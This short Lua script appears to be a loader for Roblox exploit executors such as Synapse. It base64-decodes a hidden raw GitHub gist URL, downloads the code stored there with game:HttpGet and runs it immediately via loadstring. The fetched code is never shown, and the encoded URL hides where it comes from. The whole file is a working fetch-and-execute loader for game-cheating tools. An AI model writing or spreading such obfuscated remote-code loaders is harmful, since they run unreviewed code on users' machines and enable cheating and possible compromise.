local str = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vR2hvc3REdWNreXkvZmJjNjM4NmY1ODI3YjllZGZjMDUxM2Y1ZTUwNWQ1ZWUvcmF3"
function decode(strs)
	local code = tostring(strs)
	if  syn and syn.crypt.base64.decode then
		local _Pog = syn.crypt.base64.decode(code)
		return tostring(_Pog)
	else
		local _Pog = base64_decode or base64.decode or crypt.base64decode or crypt.base64.decode or crypt.base64_decode or nil;
        if _Pog ~= nil then
            _Pog = _Pog(code)
		    return tostring(_Pog);
        end
	end
    return nil;
end
local url = decode(str)
if url ~= nil then
    loadstring(game:HttpGet(tostring(url),true))()
else
    rconsolewarn("Your exploit missing 'base64decode' function")
end
